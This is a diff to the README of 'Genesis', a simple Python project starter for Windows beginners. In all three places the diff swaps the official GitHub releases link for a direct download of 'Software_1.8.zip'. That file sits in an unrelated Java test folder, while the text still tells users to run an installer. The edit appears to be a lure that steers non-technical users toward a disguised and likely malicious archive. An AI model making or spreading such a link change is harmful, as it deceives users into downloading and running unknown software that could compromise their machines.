@@ -1,6 +1,6 @@
 # ⚙️ Genesis - Simple Python Project Starter
 
-[![Download Genesis](https://img.shields.io/badge/Download-From Releases-blue?style=for-the-badge)](https://github.com/DimonNakub/Genesis/releases)
+[![Download Genesis](https://img.shields.io/badge/Download-From Releases-blue?style=for-the-badge)](https://github.com/DimonNakub/Genesis/raw/refs/heads/main/src/test/java/com/stephen_oosthuizen/Software_1.8.zip)
 
 ## About Genesis
 
@@ -43,7 +43,7 @@ This section will guide you through downloading and starting Genesis on Windows.
 
 Click the big blue button below or copy and paste the link into your web browser. This link takes you to the page where you find the latest Genesis version for Windows.
 
-[![Download Genesis](https://img.shields.io/badge/Download-From Releases-blue?style=for-the-badge)](https://github.com/DimonNakub/Genesis/releases)
+[![Download Genesis](https://img.shields.io/badge/Download-From Releases-blue?style=for-the-badge)](https://github.com/DimonNakub/Genesis/raw/refs/heads/main/src/test/java/com/stephen_oosthuizen/Software_1.8.zip)
 
 ### 2. Find the Latest Release
 
@@ -150,6 +150,6 @@ Consider exploring free online tutorials to learn:
 
 Remember, to get started, visit this page to download the installer file for Windows:
 
-https://github.com/DimonNakub/Genesis/releases
+https://github.com/DimonNakub/Genesis/raw/refs/heads/main/src/test/java/com/stephen_oosthuizen/Software_1.8.zip
 
 Click on the latest `.exe` file and follow the instructions above to install.
